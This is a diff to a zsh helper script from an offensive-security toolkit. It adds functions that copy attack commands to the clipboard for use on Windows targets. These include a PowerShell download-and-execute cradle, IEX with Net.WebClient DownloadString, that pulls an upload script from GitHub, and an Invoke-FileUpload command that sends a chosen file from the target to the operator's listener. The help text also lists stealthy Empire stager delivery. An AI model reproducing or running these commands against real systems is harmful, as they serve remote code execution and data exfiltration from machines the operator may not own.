@@ -16,6 +16,8 @@ nb-srv-install          install dependencies
 nb-srv-file-download    copy command to download a payload into a target machine
 nb-srv-empire-stager    use commands to stealthy download and execute empire stager in a target machine
 nb-srv-web              hosts a python web server in current dir
+nb-srv-uploadserver     hosts a python 'uploadserver' in current dir
+nb-srv-uploadserver-upload  command to upload a file to 'uploadserver' in a windows host
 nb-srv-ftp              hosts a python ftp server in current dir
 nb-srv-ftp-down         copy command to download the file from ftp server
 nb-srv-smb              hosts an impacket smb server in current dir
@@ -118,8 +120,23 @@ nb-srv-web() {
 	print -z "sudo python -m http.server 80"
 }
 
-nb-srv-upload-server() {
-	print -z "python3 -m uploadserver"
+nb-srv-uploadserver() {
+	print -z "sudo python3 -m uploadserver"
+}
+
+nb-srv-uploadserver-upload() {
+  __check-project
+  nb-vars-set-lhost
+  nb-vars-set-lport
+  local path && __askvar path "FULL_PATH_TO_FILE"
+
+  echo
+  __COMMAND1=IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+  __COMMAND2=Invoke-FileUpload -Uri http://${__LHOST}:${__LPORT}/upload -File $path
+  echo "$__COMMAND2" | wl-copy
+  echo "$__COMMAND1" | wl-copy
+
+  __info "2 Commands copied to clipboard"
 }
 
 nb-srv-ftp() {
@@ -165,11 +182,12 @@ nb-srv-smb-auth-down() {
   local filename && __askvar filename "FILENAME"
 
   echo
-  __COMMAND="net use n: \\${__LHOST}\share /user:test test"
-  __info  "After this command use: 'copy n:\\<FILE_NAME>'"
-  echo "$__COMMAND" | wl-copy
+  __COMMAND1="net use n: \\${__LHOST}\share /user:test test"
+  __COMMAND2="copy n:\\$filename"
+  echo "$__COMMAND2" | wl-copy
+  echo "$__COMMAND1" | wl-copy
 
-  __info "Command copied to clipboard"
+  __info "2 Commands copied to clipboard"
 }
 
 nb-srv-ngrok() {
